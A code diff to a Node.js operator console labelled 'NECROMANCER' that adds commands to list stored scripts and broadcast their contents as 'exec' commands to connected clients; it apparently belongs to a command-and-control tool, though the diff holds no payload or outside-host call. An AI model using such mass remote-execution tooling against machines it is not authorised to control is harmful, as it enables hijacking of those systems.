@@ -1,4 +1,5 @@
 import readline from "readline";
+import fs from "fs";
 import { clientModules, broadcast } from "./server.js";
 
 const rl = readline.createInterface({
@@ -18,9 +19,19 @@ const commandsHelp = [
 		usage: "instances <number>",
 	},
 	{
+		command: "run",
+		functionality: "Runs custom scripts you have",
+		usage: "run (script name)",
+	},
+	{
 		command: "help",
 		functionality: "Shows you how to use commands",
 		usage: "help <command>",
+	},
+	{
+		command: "scripts",
+		functionality: "Lists custom scripts you have",
+		usage: "scripts",
 	},
 	{
 		command: "silent",
@@ -29,7 +40,7 @@ const commandsHelp = [
 	},
 ];
 
-export default function prompt() {
+export function prompt() {
 	rl.question("\x1b[31m[NECROMANCER]\x1b[0m ", (message) => {
 		message = message.toLowerCase();
 
@@ -51,7 +62,7 @@ export default function prompt() {
 
 		if (message.startsWith("help")) {
 			if (message === "help") {
-				console.log("Commands:")
+				console.log("Commands:");
 				for (let i = 0; i < commandsHelp.length; i++) {
 					console.log(commandsHelp[i].command);
 				}
@@ -79,8 +90,43 @@ export default function prompt() {
 			}
 		}
 
+		if (message === "scripts") {
+			listScripts();
+		}
+
+		if (message.startsWith("run")) {
+			runScript(message.split(" ")[1]);
+		}
+
 		if (message.startsWith("exec")) broadcast(message);
 
 		return prompt();
 	});
 }
+
+const scriptsDir = "../config/scripts";
+
+function listScripts() {
+	fs.readdir(scriptsDir, (err, files) => {
+		console.log("\nList of scripts in script dir:");
+		files.forEach((file) => {
+			console.log(`\x1b[34m${file}\x1b[0m`);
+		});
+		prompt();
+	});
+}
+
+function runScript(scriptName) {
+	fs.readdir(scriptsDir, (err, files) => {
+		files.forEach((file) => {
+			if (file === scriptName) {
+				fs.readFile(`${scriptsDir}/${scriptName}`, "utf8", (err, data) => {
+					console.log("\x1b[91mRunning script...\x1b[0m");
+					broadcast(`exec ${data}`);
+				});
+			}
+		});
+		prompt();
+	});
+}
+
